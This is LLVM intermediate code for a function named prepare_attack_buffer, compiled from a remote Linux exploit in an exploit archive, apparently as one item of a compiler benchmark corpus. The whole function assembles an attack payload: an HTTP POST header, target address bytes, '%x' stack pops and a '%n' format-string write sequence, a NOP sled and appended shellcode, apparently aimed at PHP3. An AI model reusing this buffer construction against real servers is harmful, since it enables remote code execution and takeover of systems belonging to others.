; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_220.c_prepare_attack_buffer.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_220.c_prepare_attack_buffer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.system_type = type { i32, i32, i32, i64, i32 }

@.str = private unnamed_addr constant [99 x i8] c"POST http://%s HTTP/1.0\0AConnection: close\0AUser-Agent: tirpitz\0AContent-Type: multipart/form-data   \00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"\11\11\11\11\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"%x \00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"%%%dd%%n%%%dd%%n%%%dd%%n%%%dd%%n\00", align 1
@PHP3_WARNING = common dso_local global i64 0, align 8
@BUF_LEN = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.5 = private unnamed_addr constant [23 x i8] c"Content-Length: 1337\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @prepare_attack_buffer(i8* %0, %struct.system_type* %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca %struct.system_type*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca [25 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store %struct.system_type* %1, %struct.system_type** %5, align 8
  store i8* %2, i8** %6, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call i32 @bzero(i8* %16, i32 2000)
  %18 = load i8*, i8** %4, align 8
  %19 = load i8*, i8** %6, align 8
  %20 = call i32 (i8*, i8*, ...) @sprintf(i8* %18, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str, i64 0, i64 0), i8* %19)
  %21 = load i8*, i8** %4, align 8
  %22 = call i32 @strlen(i8* %21)
  store i32 %22, i32* %7, align 4
  %23 = load i8*, i8** %4, align 8
  %24 = call i32 @strcat(i8* %23, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %25 = load %struct.system_type*, %struct.system_type** %5, align 8
  %26 = getelementptr inbounds %struct.system_type, %struct.system_type* %25, i32 0, i32 4
  %27 = bitcast i32* %26 to i8*
  store i8* %27, i8** %9, align 8
  %28 = load i8*, i8** %4, align 8
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @strncat(i8* %28, i8* %29, i32 4)
  %31 = load i8*, i8** %4, align 8
  %32 = call i32 @strcat(i8* %31, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %33 = load %struct.system_type*, %struct.system_type** %5, align 8
  %34 = getelementptr inbounds %struct.system_type, %struct.system_type* %33, i32 0, i32 4
  %35 = load i32, i32* %34, align 8
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %34, align 8
  %37 = load %struct.system_type*, %struct.system_type** %5, align 8
  %38 = getelementptr inbounds %struct.system_type, %struct.system_type* %37, i32 0, i32 4
  %39 = bitcast i32* %38 to i8*
  store i8* %39, i8** %9, align 8
  %40 = load i8*, i8** %4, align 8
  %41 = load i8*, i8** %9, align 8
  %42 = call i32 @strncat(i8* %40, i8* %41, i32 4)
  %43 = load i8*, i8** %4, align 8
  %44 = call i32 @strcat(i8* %43, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %45 = load %struct.system_type*, %struct.system_type** %5, align 8
  %46 = getelementptr inbounds %struct.system_type, %struct.system_type* %45, i32 0, i32 4
  %47 = load i32, i32* %46, align 8
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %46, align 8
  %49 = load %struct.system_type*, %struct.system_type** %5, align 8
  %50 = getelementptr inbounds %struct.system_type, %struct.system_type* %49, i32 0, i32 4
  %51 = bitcast i32* %50 to i8*
  store i8* %51, i8** %9, align 8
  %52 = load i8*, i8** %4, align 8
  %53 = load i8*, i8** %9, align 8
  %54 = call i32 @strncat(i8* %52, i8* %53, i32 4)
  %55 = load i8*, i8** %4, align 8
  %56 = call i32 @strcat(i8* %55, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %57 = load %struct.system_type*, %struct.system_type** %5, align 8
  %58 = getelementptr inbounds %struct.system_type, %struct.system_type* %57, i32 0, i32 4
  %59 = load i32, i32* %58, align 8
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %58, align 8
  %61 = load %struct.system_type*, %struct.system_type** %5, align 8
  %62 = getelementptr inbounds %struct.system_type, %struct.system_type* %61, i32 0, i32 4
  %63 = bitcast i32* %62 to i8*
  store i8* %63, i8** %9, align 8
  %64 = load i8*, i8** %4, align 8
  %65 = load i8*, i8** %9, align 8
  %66 = call i32 @strncat(i8* %64, i8* %65, i32 4)
  br label %67

67:                                               ; preds = %75, %3
  %68 = load %struct.system_type*, %struct.system_type** %5, align 8
  %69 = getelementptr inbounds %struct.system_type, %struct.system_type* %68, i32 0, i32 3
  %70 = load i64, i64* %69, align 8
  %71 = icmp ne i64 %70, 0
  br i1 %71, label %72, label %80

72:                                               ; preds = %67
  %73 = load i8*, i8** %4, align 8
  %74 = call i32 @strcat(i8* %73, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0))
  br label %75

75:                                               ; preds = %72
  %76 = load %struct.system_type*, %struct.system_type** %5, align 8
  %77 = getelementptr inbounds %struct.system_type, %struct.system_type* %76, i32 0, i32 3
  %78 = load i64, i64* %77, align 8
  %79 = add nsw i64 %78, -1
  store i64 %79, i64* %77, align 8
  br label %67

80:                                               ; preds = %67
  %81 = load %struct.system_type*, %struct.system_type** %5, align 8
  %82 = getelementptr inbounds %struct.system_type, %struct.system_type* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 8
  %84 = and i32 %83, 255
  %85 = load %struct.system_type*, %struct.system_type** %5, align 8
  %86 = getelementptr inbounds %struct.system_type, %struct.system_type* %85, i32 0, i32 2
  %87 = load i32, i32* %86, align 8
  %88 = call i32 @calculate_precision(i32 %84, i32 %87)
  store i32 %88, i32* %11, align 4
  %89 = load %struct.system_type*, %struct.system_type** %5, align 8
  %90 = getelementptr inbounds %struct.system_type, %struct.system_type* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 8
  %92 = and i32 %91, 65280
  %93 = ashr i32 %92, 8
  %94 = load %struct.system_type*, %struct.system_type** %5, align 8
  %95 = getelementptr inbounds %struct.system_type, %struct.system_type* %94, i32 0, i32 2
  %96 = load i32, i32* %95, align 8
  %97 = call i32 @calculate_precision(i32 %93, i32 %96)
  store i32 %97, i32* %12, align 4
  %98 = load %struct.system_type*, %struct.system_type** %5, align 8
  %99 = getelementptr inbounds %struct.system_type, %struct.system_type* %98, i32 0, i32 0
  %100 = load i32, i32* %99, align 8
  %101 = and i32 %100, 16711680
  %102 = ashr i32 %101, 16
  %103 = load %struct.system_type*, %struct.system_type** %5, align 8
  %104 = getelementptr inbounds %struct.system_type, %struct.system_type* %103, i32 0, i32 2
  %105 = load i32, i32* %104, align 8
  %106 = call i32 @calculate_precision(i32 %102, i32 %105)
  store i32 %106, i32* %13, align 4
  %107 = load %struct.system_type*, %struct.system_type** %5, align 8
  %108 = getelementptr inbounds %struct.system_type, %struct.system_type* %107, i32 0, i32 0
  %109 = load i32, i32* %108, align 8
  %110 = and i32 %109, -16777216
  %111 = lshr i32 %110, 24
  %112 = load %struct.system_type*, %struct.system_type** %5, align 8
  %113 = getelementptr inbounds %struct.system_type, %struct.system_type* %112, i32 0, i32 2
  %114 = load i32, i32* %113, align 8
  %115 = call i32 @calculate_precision(i32 %111, i32 %114)
  store i32 %115, i32* %14, align 4
  %116 = getelementptr inbounds [25 x i8], [25 x i8]* %10, i64 0, i64 0
  %117 = load i32, i32* %11, align 4
  %118 = load i32, i32* %12, align 4
  %119 = load i32, i32* %13, align 4
  %120 = load i32, i32* %14, align 4
  %121 = call i32 (i8*, i8*, ...) @sprintf(i8* %116, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0), i32 %117, i32 %118, i32 %119, i32 %120)
  %122 = load i8*, i8** %4, align 8
  %123 = getelementptr inbounds [25 x i8], [25 x i8]* %10, i64 0, i64 0
  %124 = call i32 @strcat(i8* %122, i8* %123)
  %125 = load i8*, i8** %4, align 8
  %126 = call i32 @strlen(i8* %125)
  store i32 %126, i32* %8, align 4
  %127 = load i32, i32* %8, align 4
  %128 = load i32, i32* %7, align 4
  %129 = sub nsw i32 %127, %128
  store i32 %129, i32* %7, align 4
  %130 = load i64, i64* @PHP3_WARNING, align 8
  %131 = load i32, i32* %7, align 4
  %132 = sext i32 %131 to i64
  %133 = add nsw i64 %132, %130
  %134 = trunc i64 %133 to i32
  store i32 %134, i32* %7, align 4
  %135 = load i32, i32* %8, align 4
  %136 = load i8*, i8** %4, align 8
  %137 = sext i32 %135 to i64
  %138 = getelementptr inbounds i8, i8* %136, i64 %137
  store i8* %138, i8** %4, align 8
  %139 = load i32, i32* @BUF_LEN, align 4
  %140 = load i32, i32* %7, align 4
  %141 = sub nsw i32 %139, %140
  %142 = load %struct.system_type*, %struct.system_type** %5, align 8
  %143 = getelementptr inbounds %struct.system_type, %struct.system_type* %142, i32 0, i32 1
  %144 = load i32, i32* %143, align 4
  %145 = sub nsw i32 %141, %144
  store i32 %145, i32* %15, align 4
  %146 = load i8*, i8** %4, align 8
  %147 = load i32, i32* @NOP, align 4
  %148 = load i32, i32* %15, align 4
  %149 = call i32 @memset(i8* %146, i32 %147, i32 %148)
  %150 = load i32, i32* %15, align 4
  %151 = load i8*, i8** %4, align 8
  %152 = sext i32 %150 to i64
  %153 = getelementptr inbounds i8, i8* %151, i64 %152
  store i8* %153, i8** %4, align 8
  %154 = load i8*, i8** %4, align 8
  %155 = load i8*, i8** @shellcode, align 8
  %156 = call i32 @strcat(i8* %154, i8* %155)
  %157 = load i8*, i8** %4, align 8
  %158 = call i32 @strcat(i8* %157, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  %159 = load i8*, i8** %4, align 8
  %160 = call i32 @strcat(i8* %159, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0))
  ret void
}

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @strncat(i8*, i8*, i32) #1

declare dso_local i32 @calculate_precision(i32, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
